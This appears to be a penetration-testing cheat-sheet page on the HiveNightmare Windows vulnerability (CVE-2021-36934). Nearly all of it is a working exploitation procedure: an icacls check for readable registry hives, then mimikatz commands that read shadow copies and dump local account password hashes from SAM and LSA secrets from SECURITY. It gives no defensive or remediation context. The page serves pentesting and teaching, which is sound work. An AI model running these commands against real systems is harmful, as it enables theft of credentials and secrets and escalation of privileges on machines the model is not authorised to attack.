# HiveNightmare

#### <mark style="color:green;">CVE-2021–36934 allows you to retrieve all registry hives (SAM,SECURITY,SYSTEM) in Windows 10 and 11 as a non-administrator user.</mark>

## <mark style="color:red;">Exploitation</mark>

Check for the vulnerability using icacls

```
C:\Windows\System32> icacls config\SAM
```

```
config\SAM BUILTIN\Administrators:(I)(F)
           NT AUTHORITY\SYSTEM:(I)(F)
           BUILTIN\Users:(I)(RX)    <-- this is wrong - regular users should not have read access!                    
```

Then exploit the CVE by requesting the shadowcopies on the filesystem and reading the hives from it.

```
mimikatz> token::whoami /full
```

### <mark style="color:orange;">List shadow copies available</mark>

```
mimikatz> misc::shadowcopies
```

### <mark style="color:orange;">Extract account from SAM databases</mark>

```
mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
```

### <mark style="color:orange;">Extract secrets from SECURITY</mark>

```
mimikatz> lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY
```
